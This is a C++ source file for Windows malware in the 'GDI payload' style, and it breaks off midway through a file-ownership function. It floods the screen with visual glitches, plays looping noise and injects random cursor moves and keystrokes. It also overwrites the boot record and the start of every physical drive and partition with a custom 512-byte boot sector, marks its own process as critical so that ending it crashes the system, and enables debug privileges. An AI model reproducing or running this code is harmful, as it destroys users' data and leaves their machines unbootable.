#include "Payloads.h"

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
ULONG BreakOnTermination;
NTSTATUS status;
COLORREF Hue(int length) {
    static int red = 0, green = 0, blue = 0;
    red = (red + 1) % length;
    if (red == 0) {
        green = (green + 1) % length;
        if (green == 0) {
            blue = (blue + 1) % length;
        }
    }
    return RGB(red, green, blue);
}
const int screenWidth = GetSystemMetrics(SM_CXSCREEN);
const int screenHeight = GetSystemMetrics(SM_CYSCREEN);
const int bubbleRadius = 50;
const int bubbleSpeed = 5;
const int timerInterval = 10;

int bubbleX = 0;
int bubbleY = 0;
int bubbleDirectionX = 1;
int bubbleDirectionY = 1;
// Cube properties
const int cubeSize = 200; // adjust the size of the cube as desired

// Cube position
int cubeX = 0;
int cubeY = 0;

// Cube movement direction
int cubeDirectionX = 1;
int cubeDirectionY = 1;

// Cube speed
const int cubeSpeed = 5; // adjust the speed as desired
DWORD WINAPI shake(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI sound1(LPVOID lpParam) {
    while (true) {
        HWAVEOUT hWaveOut = 0;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
        waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

        DWORD bufferSize = 32000 * 30;
        char* buffer = new char[bufferSize];
        for (DWORD t = 0; t < bufferSize; ++t)
            buffer[t] = static_cast<char>(t & t >> 6) + (t | t >> 8) + (t | t >> 7) + (t | t >> 9);

        WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);
        delete[] buffer;
    }
}
DWORD WINAPI sound2(LPVOID lpParam) {
    while (true) {
        HWAVEOUT hWaveOut = 0;
        WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
        waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

        DWORD bufferSize = 11025 * 30;
        char* buffer = new char[bufferSize];
        for (DWORD t = 0; t < bufferSize; ++t)
            buffer[t] = static_cast<char>(t ^ t * (t >> 9 | 9));

        WAVEHDR header = { buffer, bufferSize, 0, 0, 0, 0, 0, 0 };
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutClose(hWaveOut);

        delete[] buffer;
    }
}
DWORD WINAPI squares(LPVOID lpParam) {
    int x = 10, y = 10;
    int incrementor = 10;
    int signX = 1, signY = 1;

    HDC hdc = GetDC(0);

    while (1) {
        // Draw a square
        HBRUSH brush = CreateSolidBrush(Hue(256));
        SelectObject(hdc, brush);
        Rectangle(hdc, x, y, x + 100, y + 100);
        DeleteObject(brush);

        // Draw a rectangle
        brush = CreateSolidBrush(Hue(256));
        SelectObject(hdc, brush);
        Rectangle(hdc, x + 120, y, x + 220, y + 100);
        DeleteObject(brush);

        // Draw a circle
        brush = CreateSolidBrush(Hue(256));
        SelectObject(hdc, brush);
        Ellipse(hdc, x + 240, y, x + 340, y + 100);
        DeleteObject(brush);

        x += incrementor * signX;
        y += incrementor * signY;

        if (y + 100 >= GetSystemMetrics(SM_CYSCREEN) || y <= 0) {
            signY *= -1;
        }
        if (x + 340 >= GetSystemMetrics(SM_CXSCREEN) || x <= 0) {
            signX *= -1;
        }

        Sleep(10);
    }

    ReleaseDC(0, hdc);
}
DWORD WINAPI Cursor(LPVOID lpParam) {
    POINT cursor;
    GetCursorPos(&cursor);

    int runtime = 5000; // Example runtime value of 5000 milliseconds

    // Generate random offsets for cursor movement within a range
    int offsetX = (rand() % 3 - 1) * (rand() % (runtime / 2200 + 1));
    int offsetY = (rand() % 3 - 1) * (rand() % (runtime / 2200 + 1));

    SetCursorPos(cursor.x + offsetX, cursor.y + offsetY);

    return 2;
}
DWORD WINAPI Keyboard(LPVOID lpParam) {
    INPUT input;

    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (rand() % (0x5a - 0x30)) + 0x30;
    SendInput(1, &input, sizeof(INPUT));

    return 300 + (rand() % 400);
}
DWORD WINAPI dark(LPVOID lpstart) {
    HDC hdc = GetDC(HWND_DESKTOP);

    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

    while (1) {
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(hdc, rand() % 2, rand() % 2, rand() % sw, rand() % sh, hdc, rand() % 2, rand() % 2, SRCAND);
        Sleep(3);
    }
}
DWORD WINAPI extreme(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int	h = GetSystemMetrics(1);
    //for (int i = 0;; i++)
    while (true) {
        int(a) = rand() % w, b = rand() % h;
        BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, !(rand() & 3) ? 0xEE0086 : 0xCC0020);
    }
}
DWORD WINAPI Colours1(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        BitBlt(hdc, 10, 10, w, h, hdc, 12, 12, SRCCOPY);
    }
}
DWORD WINAPI Colours2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        BitBlt(hdc, 10, 100, w, h, hdc, 12, 12, SRCCOPY);
    }
}
DWORD WINAPI Colours3(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        BitBlt(hdc, 10, 100, w, h, hdc, 12, 12, SRCCOPY);
    }
}


COLORREF GetRainbowColor(double position)
{
    int r, g, b;
    double normalizedPosition = fmod(position, 1.0);

    if (normalizedPosition < 0.166)
    {
        r = 255;
        g = static_cast<int>(normalizedPosition * 1530);
        b = 0;
    }
    else if (normalizedPosition < 0.332)
    {
        r = 255 - static_cast<int>((normalizedPosition - 0.166) * 1530);
        g = 255;
        b = 0;
    }
    else if (normalizedPosition < 0.498)
    {
        r = 0;
        g = 255;
        b = static_cast<int>((normalizedPosition - 0.332) * 1530);
    }
    else if (normalizedPosition < 0.664)
    {
        r = 0;
        g = 255 - static_cast<int>((normalizedPosition - 0.498) * 1530);
        b = 255;
    }
    else if (normalizedPosition < 0.830)
    {
        r = static_cast<int>((normalizedPosition - 0.664) * 1530);
        g = 0;
        b = 255;
    }
    else
    {
        r = 255;
        g = 0;
        b = 255 - static_cast<int>((normalizedPosition - 0.830) * 1530);
    }

    return RGB(r, g, b);
}

void MoveBubble()
{
    bubbleX += bubbleDirectionX * bubbleSpeed;
    bubbleY += bubbleDirectionY * bubbleSpeed;

    if (bubbleX <= 0 || bubbleX >= screenWidth - bubbleRadius)
    {
        bubbleDirectionX *= -1;
    }
    if (bubbleY <= 0 || bubbleY >= screenHeight - bubbleRadius)
    {
        bubbleDirectionY *= -1;
    }
}

void DrawBubble(HDC hdc)
{
    HBRUSH bubbleBrush = CreateSolidBrush(GetRainbowColor(GetTickCount() * 0.001));
    SelectObject(hdc, bubbleBrush);
    Ellipse(hdc, bubbleX, bubbleY, bubbleX + bubbleRadius, bubbleY + bubbleRadius);
    DeleteObject(bubbleBrush);
}

void BubbleAnimation()
{
    HDC hdc = GetDC(NULL);

    SetTimer(NULL, 1, timerInterval, NULL);

    while (true)
    {
        MoveBubble();
        DrawBubble(hdc);

        Sleep(timerInterval);
    }

    ReleaseDC(NULL, hdc);
}
DWORD WINAPI StartBubbles(LPVOID lpParam)
{
    // Start the bubble animation in a separate thread
    std::thread animationThread(BubbleAnimation);
    animationThread.detach();

    // Message loop for the bubble animation thread
    MSG msg{};
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

// Generate a random number
int randy()
{
    static ULONGLONG previousValue = 0;
    static ULONGLONG currentNumber = 0;

    // Use xorshift algorithm to generate random number
    currentNumber = previousValue;
    currentNumber ^= 0x8ebf635bee3c6d25;
    currentNumber ^= currentNumber << 5 | currentNumber >> 26;
    currentNumber *= 0xf3e05ca5c43e376b;

    // Update the previous value for the next iteration
    previousValue = currentNumber;

    // Keep the number positive by masking the sign bit
    return currentNumber & 0x7fffffff;
}
struct POINT3D
{
    double x;
    double y;
    double z;
};
// Window procedure for the layered window
LRESULT CALLBACK CubeProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CREATE:
        // Set the window style to layered and transparent
        SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED | WS_EX_TRANSPARENT);
        // Make the window layered with per-pixel alpha
        SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
        // Set the window position and size
        SetWindowPos(hwnd, HWND_TOPMOST, cubeX, cubeY, cubeSize, cubeSize, SWP_SHOWWINDOW);
        break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        // Create a memory DC and bitmap for double buffering
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBitmap = CreateCompatibleBitmap(hdc, cubeSize, cubeSize);
        HBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, memBitmap);

        // Clear the memory DC with a transparent background
        HBRUSH backgroundBrush = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(memDC, &ps.rcPaint, backgroundBrush);
        DeleteObject(backgroundBrush);

        // Calculate cube rotation
        double angle = GetTickCount() * 0.001;

        // Define cube vertices
        POINT3D cubeVertices[8] = {
            { -cubeSize / 2, -cubeSize / 2, -cubeSize / 2 },
            { cubeSize / 2, -cubeSize / 2, -cubeSize / 2 },
            { cubeSize / 2, cubeSize / 2, -cubeSize / 2 },
            { -cubeSize / 2, cubeSize / 2, -cubeSize / 2 },
            { -cubeSize / 2, -cubeSize / 2, cubeSize / 2 },
            { cubeSize / 2, -cubeSize / 2, cubeSize / 2 },
            { cubeSize / 2, cubeSize / 2, cubeSize / 2 },
            { -cubeSize / 2, cubeSize / 2, cubeSize / 2 }
        };

        // Define cube faces
        int cubeFaces[6][4] = {
            { 0, 1, 2, 3 }, // Front face
            { 1, 5, 6, 2 }, // Right face
            { 5, 4, 7, 6 }, // Back face
            { 4, 0, 3, 7 }, // Left face
            { 3, 2, 6, 7 }, // Top face
            { 4, 5, 1, 0 }  // Bottom face
        };

        // Draw the cube
        for (int i = 0; i < 6; i++)
        {
            // Set face color
            COLORREF faceColor = RGB(
                static_cast<int>(127 * (1 + sin(angle + i * 0.5))),
                static_cast<int>(127 * (1 + sin(angle + i * 0.5 + 2))),
                static_cast<int>(127 * (1 + sin(angle + i * 0.5 + 4)))
            );
            HBRUSH faceBrush = CreateSolidBrush(faceColor);
            SelectObject(memDC, faceBrush);

            // Project and draw each face of the cube
            POINT cubePoints[4];
            for (int j = 0; j < 4; j++)
            {
                double x = cubeVertices[cubeFaces[i][j]].x;
                double y = cubeVertices[cubeFaces[i][j]].y;
                double z = cubeVertices[cubeFaces[i][j]].z;

                // Apply 3D transformation and perspective projection
                double transformedX = x * cos(angle) - y * sin(angle);
                double transformedY = x * sin(angle) + y * cos(angle);
                double transformedZ = z;

                double perspectiveFactor = 1.0 / (transformedZ / cubeSize + 1.0);
                int projectedX = static_cast<int>(transformedX * perspectiveFactor + cubeSize / 2);
                int projectedY = static_cast<int>(transformedY * perspectiveFactor + cubeSize / 2);

                cubePoints[j].x = projectedX;
                cubePoints[j].y = projectedY;
            }

            Polygon(memDC, cubePoints, 4);
            DeleteObject(faceBrush); // Delete the faceBrush after use
        }

        // Blit the contents of the memory DC onto the window
        BitBlt(hdc, 0, 0, cubeSize, cubeSize, memDC, 0, 0, SRCCOPY);

        // Clean up resources
        SelectObject(memDC, oldBitmap);
        DeleteObject(memBitmap);
        DeleteDC(memDC);

        EndPaint(hwnd, &ps);
        break;
    }
    case WM_TIMER: {
        // Move the cube to the next position based on the direction and speed
        cubeX += cubeDirectionX * cubeSpeed;
        cubeY += cubeDirectionY * cubeSpeed;

        // Get the screen dimensions
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        // Check if the cube reaches the screen boundaries
        if (cubeX <= 0 || cubeX >= screenWidth - cubeSize)
        {
            cubeDirectionX *= -1; // Reverse the direction
        }
        if (cubeY <= 0 || cubeY >= screenHeight - cubeSize)
        {
            cubeDirectionY *= -1; // Reverse the direction
        }

        // Update the window position
        SetWindowPos(hwnd, HWND_TOPMOST, cubeX, cubeY, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW);
        InvalidateRect(hwnd, NULL, FALSE);
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}
DWORD WINAPI CubeThread(LPVOID lpParam)
{
    // Create a hidden window for the cube
    HINSTANCE hInstance = GetModuleHandle(NULL);
    // Register the window class
    WNDCLASSEX wc = {};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = CubeProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"RainbowCubeWindowClass";
    RegisterClassEx(&wc);

    // Create the window
    HWND hwnd = CreateWindowEx(WS_EX_LAYERED | WS_EX_TRANSPARENT, wc.lpszClassName, L"Persistent Rainbow Cube",
        WS_POPUP, 0, 0, cubeSize, cubeSize, NULL, NULL, hInstance, NULL);

    if (hwnd)
    {
        // Set the timer for cube movement
        SetTimer(hwnd, 1, timerInterval, NULL);

        // Make the window layered with per-pixel alpha
        SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);

        // Show and update the window
        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
        // Message loop for the cube window
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Clean up resources
        DestroyWindow(hwnd);
        UnregisterClass(wc.lpszClassName, hInstance);
    }

    return 0;
}
DWORD WINAPI Payload1(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0;; i++) {
        int x = randy() % width;
        int y = randy() % height;
        BitBlt(hdc, x, y, 200, 200, hdc, x + randy() % 21 - 10, y + randy() % 21 - 10, !(randy() & 3) ? SRCERASE : SRCCOPY);
    }
}

DWORD WINAPI Payload3(LPVOID lpParam)
{
    HDC hdc = GetDC(0);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0;; i++) {
        int x = randy() % width;
        int y = randy() % height;
        BitBlt(hdc, x, y, 500, 500, hdc, x + randy() % 51 - 20, y + randy() % 51 - 20, !(randy() & 6) ? SRCERASE : SRCCOPY);
    }
}

DWORD WINAPI Payload2(LPVOID lpParam)
{
    int time = GetTickCount64();
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
        (width * height + width) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        if (!1) RedrawWindow(0, 0, 0, 133);
        HDC hdc = GetDC(0), hdcCompatible = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
        SelectObject(hdcCompatible, hBitmap);
        BitBlt(hdcCompatible, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, width * height * 4, data);
        int v = 0;
        BYTE randomness = 0;
        if ((GetTickCount64() - time) > 60000)
            randomness = randy() & 0xff;
        for (int i = 0; i < width * height; i++) {
            if (i % height == 0 && randy() % 100 == 0)
                v = randy() % 50;
            ((BYTE*)(data + i))[v % 3] += (((BYTE*)(data + i + v))[v] ^ randomness);
        }
        SetBitmapBits(hBitmap, width * height * 4, data);
        BitBlt(hdc, randy() % 3 - 1, randy() % 3 - 1, width, height, hdcCompatible, 0, 0, 0xCC0020);
        DeleteObject(hBitmap);
        DeleteDC(hdcCompatible);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Payload4(LPVOID lpParam)
{
    int time = GetTickCount64();
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
        (width * height + width) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    for (int i = 0;; i++, i %= 4) {
        if (!1)RedrawWindow(0, 0, 0, 420);
        HDC hdc = GetDC(0), hdcCompatible = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
        SelectObject(hdcCompatible, hBitmap);
        BitBlt(hdcCompatible, 0, 0, width, height, hdc, 0, 0, 0x3300420);
        GetBitmapBits(hBitmap, width * height * 4, data);
        int v = 0;
        BYTE randomness = 0;
        if ((GetTickCount64() - time) > 60000)
            randomness = randy() & 0xff;
        for (int i = 0; i < width * height; i++) {
            if (i % height == 0 && randy() % 100 == 0)
                v = randy() % 50;
            ((BYTE*)(data + i))[v % 3] += (((BYTE*)(data + i + v))[v] ^ randomness);
        }
        SetBitmapBits(hBitmap, width * height * 4, data);
        BitBlt(hdc, randy() % 4 - 2, randy() % 4 - 2, width, height, hdcCompatible, 0, 0, 0xCC0420);
        DeleteObject(hBitmap);
        DeleteDC(hdcCompatible);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Payload5(LPVOID lpParam)
{
    int time = GetTickCount64();
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
        (width * height + width) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    for (int i = 0;; i++, i %= 4) {
        if (!1)RedrawWindow(0, 0, 0, 810);
        HDC hdc = GetDC(0), hdcCompatible = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
        SelectObject(hdcCompatible, hBitmap);
        BitBlt(hdcCompatible, 0, 0, width, height, hdc, 0, 0, 0x3300420);
        GetBitmapBits(hBitmap, width * height * 4, data);
        int v = 0;
        BYTE randomness = 0;
        if ((GetTickCount64() - time) > 80000)
            randomness = randy() & 0xff;
        for (int i = 0; i < width * height; i++) {
            if (i % height == 0 && randy() % 100 == 0)
                v = randy() % 50;
            ((BYTE*)(data + i))[v % 3] += (((BYTE*)(data + i + v))[v] ^ randomness);
        }
        SetBitmapBits(hBitmap, width * height * 4, data);
        BitBlt(hdc, randy() % 8 - 4, randy() % 8 - 1, width, height, hdcCompatible, 0, 0, 0xCC0810);
        DeleteObject(hBitmap);
        DeleteDC(hdcCompatible);
        ReleaseDC(0, hdc);
    }
}
const unsigned char BootRecord[] = {
    0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C,
    0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10,
    0x0F, 0x31, 0xA3, 0x7A, 0x7C, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9, 0xB1, 0x20, 0xEB,
    0x18, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09, 0x31, 0xC3, 0x89,
    0xD8, 0xC1, 0xE0, 0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0x8B, 0x1E, 0x7A, 0x7C, 0xE8, 0xE1, 0xFF,
    0x31, 0x06, 0x7A, 0x7C, 0x31, 0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26,
    0x88, 0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04,
    0xFE, 0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xCF, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
/*Old Way Useless!*/
//void Flash() {
//    DWORD dwBytesWritten;
//    HANDLE hDevice = CreateFileW(
//        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
//        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
//        OPEN_EXISTING, 0, 0);
//
//    WriteFile(hDevice, BootRecord, 512, &dwBytesWritten, 0); // write the file to the handle
//    CloseHandle(hDevice); // close the handle
//}
LPCWSTR overwrite[] = {
    L"\\\\.\\PhysicalDrive0",
    L"\\\\.\\PhysicalDrive1",
    L"\\\\.\\PhysicalDrive2",
    L"\\\\.\\C:",
    L"\\\\.\\D:",
    L"\\\\.\\E:",
    L"\\\\.\\Harddisk0Partition1",
    L"\\\\.\\Harddisk0Partition2",
    L"\\\\.\\Harddisk0Partition3",
    L"\\\\.\\Harddisk0Partition4",
    L"\\\\.\\Harddisk0Partition5",
    L"\\\\.\\Harddisk1Partition1",
    L"\\\\.\\Harddisk1Partition2",
    L"\\\\.\\Harddisk1Partition3",
    L"\\\\.\\Harddisk1Partition4",
    L"\\\\.\\Harddisk1Partition5",
    L"\\\\.\\Harddisk2Partition1",
    L"\\\\.\\Harddisk2Partition2",
    L"\\\\.\\Harddisk2Partition3",
    L"\\\\.\\Harddisk2Partition4",
    L"\\\\.\\Harddisk2Partition5"
};

long long FileNum = 0;
const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);

void OverWrite(LPCWSTR Name) {
    HANDLE hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    //unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < 50000; i++) {
        WriteFile(hFile, BootRecord, 512, &dwUnused, NULL);
    }
    CloseHandle(hFile);
}

void OverWriteDisk() {
    for (int i = 0; i < nOverwrite; i++) {
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
        Sleep(10);
    }
}
bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return false;
    }

    return true;
}
void SetCriticalProcess() {
    BOOL bl;
    NTSTATUS status;
    ULONG BreakOnTermination = 1;

    // Get a handle to the current process
    HANDLE hProcess = GetCurrentProcess();

    // Enable the "SeDebugPrivilege" privilege for this process
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // handle error
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
        // handle error
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        // handle error
    }

    // Set the process as critical
    if (!SetProcessShutdownParameters(0x100, SHUTDOWN_NORETRY)) {
        // handle error
    }

    // Set the process as critical
    status = NtSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
    if (!NT_SUCCESS(status)) {
        // handle error
        ExitWindows(EWX_REBOOT, 0);
    }
}
bool TakeOwnership(LPCTSTR lpszOwnFile)
{
    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    const int NUM_ACES = 2;
